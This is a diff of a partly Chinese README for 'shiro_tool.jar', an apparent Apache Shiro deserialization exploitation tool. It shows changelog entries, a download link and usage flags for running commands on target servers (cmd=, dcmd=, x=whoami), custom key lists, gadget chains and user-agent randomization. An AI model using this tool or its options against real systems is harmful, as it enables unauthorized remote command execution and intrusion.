@@ -3,14 +3,18 @@
 ```
 下载地址：https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip  
 
+2021-03-31：
+新增自定义或随机useragent
+randomagent --> random useragent
+useragent=  --> set useragent
+
+
 2020-10-16：
 放出来一些功能：
 1、spring/tomcat回显，执行命令的时候，x=whoami 就行
 2、批量检测是否shiro, java -cp shiro_tool.jar shiro.Check http://url 或者 java -cp shiro_tool.jar shiro.Check urls=文件
 3、目标服务器不出网的情况下探测
 
-其他：
-通用的几种内存SHELL和回显不再放出，目前JAR已经被解压COPY了各种外部版本，后期不再对外更新。
 
 2020-08-21: 
 新增了cc8 cc9 cc10利用链
@@ -22,11 +26,19 @@
 原来的停止服务了，请下载最新版本。
 
 
-java -jar shiro_tool.jar https://xx.xx.xx.xx
-nocheck --> skip check target is shiro or not.
-key= --> set a shiro key.
-req= --> request body file 抓包保存到文件里，这里写文件名
-keys= --> keys file  自定义key的文件，key按行分割，即每行写一个
+Usage: java -jar shiro_tool.jar https://xx.xx.xx.xx
+nocheck     --> skip check target is shiro or not.
+skip        --> all gadget default can be use
+randomagent --> random useragent
+useragent=  --> set useragent
+x=          --> print result
+cmd=        --> set command to run
+dcmd=       --> set command to run, command format base64 string
+key=        --> set a shiro key
+req=        --> request body file   request body file 抓包保存到文件里，这里写文件名
+keys=       --> keys file       自定义key的文件，key按行分割，即每行写一个
+java -cp shiro_tool.jar shiro.Check
+
 
 [admin@ shiro]java - shiro_tool.jar https://xx.xx.xx.xx/          
 [-] target: https://xx.xx.xx.xx/
